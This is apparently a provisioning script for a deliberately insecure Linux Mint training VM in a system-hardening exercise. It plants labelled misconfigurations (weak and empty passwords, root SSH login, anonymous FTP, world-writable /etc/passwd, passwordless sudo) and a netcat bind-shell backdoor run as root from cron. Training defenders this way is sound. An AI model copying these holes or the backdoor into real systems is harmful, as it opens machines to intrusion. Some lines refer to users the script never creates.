#!/bin/bash

echo "=========================================="
echo "Provisioning Linux Mint Practice VM"
echo "=========================================="

# Update system
apt update -y
DEBIAN_FRONTEND=noninteractive apt upgrade -y

# Install Cinnamon desktop environment to simulate Linux Mint
echo "Installing Cinnamon desktop environment..."
DEBIAN_FRONTEND=noninteractive apt install -y cinnamon-desktop-environment lightdm
systemctl set-default graphical.target

# Configure auto-login for vagrant user
mkdir -p /etc/lightdm/lightdm.conf.d
cat > /etc/lightdm/lightdm.conf.d/50-autologin.conf << EOF
[Seat:*]
autologin-user=vagrant
autologin-user-timeout=0
EOF

# Create authorized administrators (should have sudo)
useradd -m -s /bin/bash mwheeler
useradd -m -s /bin/bash dhenderson
useradd -m -s /bin/bash lsinclair
useradd -m -s /bin/bash nwheeler
useradd -m -s /bin/bash sharrington

# Set admin passwords (some weak, some strong)
echo "mwheeler:p4Lac|In11" | chpasswd
echo "dhenderson:w@teRG/\t3" | chpasswd
echo "lsinclair:ne\/er3ND5try" | chpasswd
echo "nwheeler:inn3r5tRE|\|gth" | chpasswd
echo "sharrington:ahoy" | chpasswd

# VULNERABILITY 1: Not all admins in sudo group - nwheeler and sharrington missing
usermod -aG sudo mwheeler
usermod -aG sudo dhenderson
usermod -aG sudo lsinclair

# Create authorized regular users
useradd -m -s /bin/bash jhopper
useradd -m -s /bin/bash jbyers
useradd -m -s /bin/bash kwheeler
useradd -m -s /bin/bash mbrenner
useradd -m -s /bin/bash wbyers
useradd -m -s /bin/bash mmayfield
useradd -m -s /bin/bash bhargrove
useradd -m -s /bin/bash bnewby
useradd -m -s /bin/bash sowens
useradd -m -s /bin/bash rbuckley
useradd -m -s /bin/bash mbauman
useradd -m -s /bin/bash argyle
useradd -m -s /bin/bash emunson
useradd -m -s /bin/bash gareth
useradd -m -s /bin/bash jeff
useradd -m -s /bin/bash cpowell
useradd -m -s /bin/bash hwheeler
useradd -m -s /bin/bash ocallahan
useradd -m -s /bin/bash sbingham
useradd -m -s /bin/bash dantonov
useradd -m -s /bin/bash alexei

# VULNERABILITY 2: Unauthorized users created
useradd -m -s /bin/bash benl
useradd -m -s /bin/bash trentinv
useradd -m -s /bin/bash jhoppe
useradd -m -s /bin/bash temp

# VULNERABILITY 3: Weak passwords for users
echo "benl:guest" | chpasswd
echo "hwheeler:changeme" | chpasswd
echo "alexei:password123" | chpasswd
echo "temp:temp" | chpasswd

# VULNERABILITY 4: Unauthorized user with sudo
usermod -aG sudo attacker
echo "alexi:password123" | chpasswd

# VULNERABILITY 5: Some users have no passwords set
# bhargrove, sowens, ocallahan left passwordless

# VULNERABILITY 6: Weak passwords for authorized users
echo "jhopper:password" | chpasswd
echo "jbyers:123456" | chpasswd
echo "kwheeler:abc123" | chpasswd
echo "wbyers:mint" | chpasswd
echo "rbuckley:letmein" | chpasswd

# Set remaining user passwords properly
echo "mbrenner:Str0ng!P@ss22" | chpasswd
echo "mmayfield:Complex@99!" | chpasswd
echo "bnewby:Secure#Pass88" | chpasswd
echo "mbauman:MyP@ssw0rd24!" | chpasswd
echo "argyle:S3cur3*Pass!" | chpasswd
echo "emunson:Dragonfire#24" | chpasswd
echo "gareth:Knight!Quest9" | chpasswd
echo "jeff:P@ladin2024!" | chpasswd
echo "cpowell:Str0ngPwd#22" | chpasswd
echo "hwheeler:Secure*P@ss88" | chpasswd
echo "sbingham:MySecret#24" | chpasswd
echo "dantonov:Rus5ian!P@ss" | chpasswd
echo "alexei:Strange#Thing5" | chpasswd

# VULNERABILITY 7: Regular user given admin rights incorrectly
usermod -aG sudo kwheeler

# VULNERABILITY 8: Password policy disabled/weakened
sed -i 's/pam_pwquality.so/pam_pwquality.so retry=0 minlen=4 difok=1/' /etc/pam.d/common-password

# VULNERABILITY 9: Password aging disabled
sed -i 's/^PASS_MAX_DAYS.*/PASS_MAX_DAYS 99999/' /etc/login.defs
sed -i 's/^PASS_MIN_DAYS.*/PASS_MIN_DAYS 0/' /etc/login.defs
sed -i 's/^PASS_WARN_AGE.*/PASS_WARN_AGE 0/' /etc/login.defs

# VULNERABILITY 10: Apache installed with insecure configuration
apt install -y apache2
systemctl enable apache2
echo "ServerTokens Full" >> /etc/apache2/conf-enabled/security.conf
echo "ServerSignature On" >> /etc/apache2/conf-enabled/security.conf
echo "<Directory /var/www/html>" >> /etc/apache2/apache2.conf
echo "    Options Indexes FollowSymLinks" >> /etc/apache2/apache2.conf
echo "</Directory>" >> /etc/apache2/apache2.conf

# VULNERABILITY 11: Samba installed with public share
apt install -y samba
systemctl enable smbd
echo "" >> /etc/samba/smb.conf
echo "[public]" >> /etc/samba/smb.conf
echo "   path = /srv/samba" >> /etc/samba/smb.conf
echo "   public = yes" >> /etc/samba/smb.conf
echo "   writable = yes" >> /etc/samba/smb.conf
echo "   guest ok = yes" >> /etc/samba/smb.conf
mkdir -p /srv/samba
chmod 777 /srv/samba

# VULNERABILITY 12: Dangerous services installed
apt install -y rsh-server telnetd vsftpd
systemctl enable rsh.socket

# VULNERABILITY 13: Firewall disabled
iptables -F
iptables -X
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT

# VULNERABILITY 14: SSH with root login and weak settings
apt install -y openssh-server
sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/#PermitEmptyPasswords.*/PermitEmptyPasswords yes/' /etc/ssh/sshd_config
echo "Protocol 1,2" >> /etc/ssh/sshd_config

# VULNERABILITY 15: FTP anonymous access enabled
sed -i 's/anonymous_enable=NO/anonymous_enable=YES/' /etc/vsftpd.conf
sed -i 's/#write_enable=YES/write_enable=YES/' /etc/vsftpd.conf
systemctl enable vsftpd

# VULNERABILITY 16: Hidden malicious files
echo "FLAG{mint_secret_flag}" > /etc/.secret_flag
chmod 644 /etc/.secret_flag
echo "#!/bin/bash" > /tmp/.backdoor.sh
echo "nc -lvp 5555 -e /bin/bash" >> /tmp/.backdoor.sh
chmod +x /tmp/.backdoor.sh

# VULNERABILITY 17: Cron backdoor jobs
echo "*/5 * * * * root /tmp/.backdoor.sh" > /etc/cron.d/system_update
chmod 644 /etc/cron.d/system_update

# VULNERABILITY 18: World-writable sensitive files
chmod 666 /etc/passwd
chmod 666 /etc/group
chmod 644 /etc/shadow

# VULNERABILITY 19: Prohibited media and hacking tools
mkdir -p /home/attacker/downloads
mkdir -p /home/guest1/media
echo "dummy mp3 content" > /home/guest1/media/music.mp3
echo "dummy mp4 content" > /home/attacker/downloads/movie.mp4
echo "sensitive data" > /home/temp/company_secrets.txt
chmod 777 /home/temp/company_secrets.txt
chown -R attacker:attacker /home/attacker/downloads
chown -R guest1:guest1 /home/guest1/media

# VULNERABILITY 20: Hacking tools installed
apt install -y nmap nikto john hydra aircrack-ng netcat wireshark

# Create dragonfire group (but don't add members - that's the task)
groupadd dragonfire

# ADDITIONAL: Sudo with no password for unauthorized users
echo "guest1 ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
echo "%temp ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Install scoring
mkdir -p /opt/scoring
cp -r /home/vagrant/Desktop/scoring/* /opt/scoring/ 2>/dev/null || true
chmod +x /opt/scoring/score.sh 2>/dev/null || true
ln -sf /opt/scoring/score.sh /usr/local/bin/score 2>/dev/null || true

# Restart affected services
systemctl restart ssh 2>/dev/null || true
systemctl restart apache2 2>/dev/null || true
systemctl restart smbd 2>/dev/null || true
systemctl restart vsftpd 2>/dev/null || true

# Set file permissions - make dev directory read-only except for logs/ and data/
echo "Setting file permissions on dev directory..."
DEV_DIR="/home/vagrant/Desktop/dev"

# Remove write permissions from all directories recursively
find "$DEV_DIR" -type d -exec chmod u-w,g-w,o-w {} \;
find "$DEV_DIR" -type f -exec chmod u-w,g-w,o-w {} \;

# Grant write permissions to logs/ and data/ directories and their contents
if [ -d "$DEV_DIR/logs" ]; then
    find "$DEV_DIR/logs" -type d -exec chmod u+w,g+w,o+w {} \;
    find "$DEV_DIR/logs" -type f -exec chmod u+w,g+w,o+w {} \;
fi

if [ -d "$DEV_DIR/data" ]; then
    find "$DEV_DIR/data" -type d -exec chmod u+w,g+w,o+w {} \;
    find "$DEV_DIR/data" -type f -exec chmod u+w,g+w,o+w {} \;
fi

echo "File permissions configured successfully."

